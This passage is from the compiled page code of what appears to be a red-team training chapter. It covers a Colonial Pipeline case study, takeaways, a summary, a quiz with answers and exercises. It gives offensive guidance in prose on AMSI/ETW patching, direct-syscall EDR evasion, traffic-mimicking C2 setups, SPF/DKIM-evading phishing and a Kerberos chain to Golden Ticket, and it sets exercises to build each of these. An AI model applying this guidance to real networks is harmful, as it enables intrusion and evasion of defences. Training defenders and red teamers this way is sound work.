          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Attribute"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Detail"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Attribution"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DarkSide (Russian-speaking ransomware group, since disbanded)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Initial Access"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPN credentials obtained via phishing/reused password"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Duration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "2 hours from initial access to 100GB exfiltration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ransom Paid"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "~$4.4 million (75 BTC)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Impact"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "5,500-mile pipeline shut down, aviation fuel shortages, US emergency declaration"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Attack Timeline:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.pre, {
      children: (0,jsx_runtime.jsx)(_components.code, {
        children: "T+0:00 — Phishing email with reused VPN password\nT+0:15 — DarkSide accesses Colonial Pipeline VPN\nT+0:30 — C2 beacon established via HTTPS\nT+1:00 — LSASS dump -> domain admin credentials\nT+1:30 — PsExec to all domain-joined servers\nT+2:00 — 100GB data exfiltrated via C2\nT+2:30 — Ransomware deployed via GPO push\n"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Key Red Team Lessons:"
      })
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Lesson"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Application"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Single phishing email can compromise a pipeline"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Phishing ops are highest ROI initial access"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Stolen passwords are still effective"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Password reuse is your biggest enabler"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Lateral movement via PsExec is fast"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prepare for speed: 2 hours to domain dominance"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Ransomware via GPO is highly effective"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GPO as a deployment mechanism scales instantly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Operational downtime drives ransom payment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Business impact matters more than technical sophistication"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "practical-takeaways",
      children: "Practical Takeaways"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Takeaway"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Application"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Use Malleable C2 profiles to evade network detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Customize HTTP headers, URIs, jitter, and sleep mask to mimic legitimate traffic (e.g., OneDrive, Slack) and bypass NTA/ZTNA"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Deploy a split C2 infrastructure"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Separate team server, redirectors (Nginx/Apache mod_rewrite), and CDN front-end to hide the true C2 origin"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Automate phishing with personalized payloads"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use GoPhish templates with tracking pixels and per-target credentials; measure open/click/submit rates to refine TTPs"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Chain Kerberos attacks for domain dominance"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Start with SPN enumeration → Kerberoast → Silver Ticket → DCSync → Golden Ticket for full domain compromise"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Combine AMSI bypass + direct syscalls for EDR evasion"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["Patch ", (0,jsx_runtime.jsx)(_components.code, {
              children: "amsi.dll!AmsiScanBuffer"
            }), ", patch ETW via ", (0,jsx_runtime.jsx)(_components.code, {
              children: "ntdll!EtwEventWrite"
            }), ", then use Hell's Gate to resolve unhooked syscalls"]
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Map every technique to MITRE ATT&CK"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Each engagement action should log the ATT&CK technique ID (e.g., T1059.001, T1003.001) for detection gap analysis"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "summary",
      children: "Summary"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "This chapter covered advanced red team operations and C2 frameworks across the full adversary emulation lifecycle. Key takeaways:"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Red Team Methodology:"
          }), " The kill chain (Planning through Reporting) provides a structured approach to adversary simulation. Every phase has specific techniques, tools, and success criteria."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.p, {
          children: (0,jsx_runtime.jsx)(_components.strong, {
            children: "C2 Frameworks:"
          })
        }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "Cobalt Strike"
            }), " remains the gold standard with Malleable C2 profiles, beaconing, BOFs, and extensive ecosystem support."]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "Sliver"
            }), " offers a free, open-source Go-based alternative with mTLS, armory for community tools, and operator RBAC."]
          }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
            children: [(0,jsx_runtime.jsx)(_components.strong, {
              children: "Covenant"
            }), " innovates with .NET-based dynamic C# compilation for task execution at runtime."]
          }), "\n"]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Phishing Operations:"
          }), " SMTP relay infrastructure, SPF/DKIM/DMARC evasion, and tracking-pixel analytics form the foundation of the most common initial access vector. GoPhish provides a complete framework with web UI and REST API."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Adversary Emulation:"
          }), " Mapping to MITRE ATT&CK enables structured testing of detections. APT29's SolarWinds operation and APT41's multi-industry campaigns demonstrate real-world TTPs."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Evasion Techniques:"
          }), " AMSI bypass (memory patching, reflection), ETW patching, direct syscalls (Hell's Gate/Halo's Gate), and sandbox detection are critical for operating against modern defenses."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Lateral Movement:"
          }), " WMI, PsExec, WinRM, DCOM, and PtH/OPtH provide multiple pathways for expanding access within a network. Each method has different detection profiles."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Kerberos Attacks:"
          }), " Kerberoasting, AS-REP roasting, Silver/Golden tickets, DCSync, and Skeleton Key represent a progression from low-privilege enumeration to full domain compromise."]
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
          children: [(0,jsx_runtime.jsx)(_components.strong, {
            children: "Case Studies:"
          }), " SolarWinds (APT29) and Colonial Pipeline (DarkSide) demonstrate real-world application of these techniques at scale."]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "chapter-quiz-10-questions",
      children: "Chapter Quiz (10 Questions)"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "#"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Question"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "A"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "B"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "C"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "D"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Answer"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "1"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which of the following best describes a Malleable C2 profile?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A YARA rule for detecting Cobalt Strike beacons"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A configuration file defining HTTP headers, URIs, and timing for beacon traffic"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A PowerShell script for deploying Cobalt Strike"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "A network capture filter for C2 traffic analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "2"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What is the primary difference between Hell's Gate and Halo's Gate?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hell's Gate is for AMSI bypass, Halo's Gate is for ETW bypass"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hell's Gate extracts syscall numbers from clean ntdll; Halo's Gate scans backward past EDR hooks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hell's Gate works on x86 only, Halo's Gate on x64"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "There is no difference — they are the same technique"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "3"
          }), (0,jsx_runtime.jsxs)(_components.td, {
            children: ["In Cobalt Strike, what does the ", (0,jsx_runtime.jsx)(_components.code, {
              children: "stage.sleep_mask"
            }), " directive do?"]
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prevents the beacon from sleeping"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Encrypts the beacon in memory during sleep cycles"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Masks the beacon's network traffic as HTTP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hides the beacon process from task manager"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "4"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which Windows Event ID indicates a new service installation (commonly used for persistence)?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4624"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4688"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "7045"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "4769"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "C"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "5"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What is the primary detection indicator for Kerberoasting?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High volume of Event ID 4624 (logon)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High volume of Event ID 4769 (TGS requests) using RC4 encryption"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High volume of Event ID 4688 (process creation)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "High volume of Event ID 5140 (SMB access)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "6"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "In the context of phishing, what is the purpose of a tracking pixel?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To encrypt the email payload"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To detect when a recipient opens the email by loading a hidden 1x1 image"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To replace the sender's email address with a spoofed address"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "To bypass SPF/DKIM/DMARC checks"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "7"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which privilege is required to perform a DCSync attack?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Any domain user"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Local Administrator on a workstation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Domain Admin or Replication rights"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Enterprise Admin"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "C"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "8"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What is the primary use case for Sliver's armory?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Storing encryption keys for implants"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Hosting community-contributed tools (BOFs, assemblies, aliases)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Managing operator credentials"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Logging C2 traffic for analysis"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "9"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Which lateral movement technique relies on creating a remote service via SMB?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WinRM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WMI"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PsExec"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "DCOM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "C"
            })
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "10"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "What makes the SolarWinds attack particularly notable for red teams?"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It was the fastest ransomware attack in history"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It demonstrated supply chain compromise with signed payloads and extended stealth operations"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It used zero-day exploits exclusively"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "It was performed by hacktivists rather than nation-state actors"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: (0,jsx_runtime.jsx)(_components.strong, {
              children: "B"
            })
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "exercises",
      children: "Exercises"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-1-c2-beacon-profile-design",
        children: "Exercise 1: C2 Beacon Profile Design"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Design a Malleable C2 profile for imitating Microsoft OneDrive traffic. Define:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "HTTP GET and POST URIs"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Cookie-based metadata embedding"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Header ordering matching OneDrive"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Jitter and sleep values"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Stage settings (sleep_mask, obfuscation)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Custom string replacements to avoid signature matching"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Write your profile configuration and explain why each setting improves stealth."
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-2-sliver-c2-deployment",
        children: "Exercise 2: Sliver C2 Deployment"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Create a Sliver deployment plan for a 3-person red team operation against a Windows domain:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "List the operators you would create and their permissions"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Define which listeners you would deploy (protocol, port, domain)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Generate beacon configurations for Windows and Linux targets"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Install three armory packages and describe their use cases"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Write the Sliver commands for deploying an implant to a remote host"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-3-phishing-campaign-simulation",
        children: "Exercise 3: Phishing Campaign Simulation"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Using the TypeScript PhishingCampaignManager class:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Create a targeted phishing campaign against the \"Engineering\" department (10 recipients)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "The email should claim to be a \"Code Review Request\" from a peer"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Include personalized elements (first name, project name)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Configure SMTP to bypass SPF/DKIM (specify which strategy you use)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Simulate tracking events and calculate: open rate, click rate, and submission rate"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Explain how tracking pixels and redirect URLs capture credential submissions"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-4-kerberos-attack-chain",
        children: "Exercise 4: Kerberos Attack Chain"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Execute the full Kerberos attack chain against a simulated domain:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Enumerate SPNs using TypeScript KerberoastingEngine"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Request TGS tickets for crackable service accounts"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Forge a Silver Ticket to access the MSSQL service"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Obtain KRBTGT hash via DCSync"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Forge a Golden Ticket for full domain compromise"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Explain each detection opportunity and mitigation"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-5-lateral-movement-playbook",
        children: "Exercise 5: Lateral Movement Playbook"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Using the LateralMovementExecutor class:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Enumerate 5 reachable hosts in a domain (simulated)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "For each host, select the optimal lateral movement method based on open ports"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Execute a command to deploy a C2 beacon on each host"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Implement credential reuse: if one method succeeds, try the same hash against other hosts"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Analyze detection risk for each method and propose evasion measures"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-6-evasion-technique-implementation",
        children: "Exercise 6: Evasion Technique Implementation"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Using the AmsiBypassGenerator and HellGateResolver classes:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Generate an AMSI bypass variant with base64 obfuscation"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Generate an ETW patch string"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Use Hell's Gate to resolve NtAllocateVirtualMemory syscall number"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Use Halo's Gate to find a clean syscall for NtOpenProcess (assuming it's hooked)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Write the resulting direct syscall stub as a byte array"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Test sandbox detection: configure the detector with 5 suspicious indicators and verify it triggers evasion"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-7-red-team-engagement-report",
        children: "Exercise 7: Red Team Engagement Report"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Write a mock red team post-engagement report for a compromised domain, covering:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Executive summary (non-technical)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Technical findings with MITRE ATT&CK mappings"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Timeline of engagement events"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Detection gaps identified"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Remediation recommendations prioritized by risk"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Attachments: extracted hashes, tool outputs, network captures"
        }), "\n"]
      }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
        id: "exercise-8-apt-emulation-plan",
        children: "Exercise 8: APT Emulation Plan"
      }), "\n", (0,jsx_runtime.jsx)(_components.p, {
        children: "Create an emulation plan for APT41 targeting a fictional video game company:"
      }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
        children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Map all TTPs to MITRE ATT&CK IDs"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Write the Atomic Red Team commands for each step"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Define expected detection signatures (log sources, event IDs)"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Create cleanup procedures after each atomic test"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Measure success criteria: was the action detected by blue team?"
        }), "\n", (0,jsx_runtime.jsx)(_components.li, {
          children: "Document lessons learned for improving detection coverage"
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "references",
      children: "References"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Cobalt Strike Documentation: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://www.cobaltstrike.com/help-malleable-c2",
          children: "https://www.cobaltstrike.com/help-malleable-c2"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Sliver C2 Framework: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/BishopFox/sliver",
          children: "https://github.com/BishopFox/sliver"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Covenant C2 Framework: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/cobbr/Covenant",
          children: "https://github.com/cobbr/Covenant"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["MITRE ATT&CK: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://attack.mitre.org",
          children: "https://attack.mitre.org"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Atomic Red Team: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://github.com/redcanaryco/atomic-red-team",
          children: "https://github.com/redcanaryco/atomic-red-team"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["GoPhish: ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://getgophish.com",
          children: "https://getgophish.com"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["SolarWinds Investigation (Mandiant): ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://www.mandiant.com/resources/sunburst-backdoor",
          children: "https://www.mandiant.com/resources/sunburst-backdoor"
        })]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: ["Colonial Pipeline Incident (CISA): ", (0,jsx_runtime.jsx)(_components.a, {
          href: "https://www.cisa.gov/colonial-pipeline-attack",
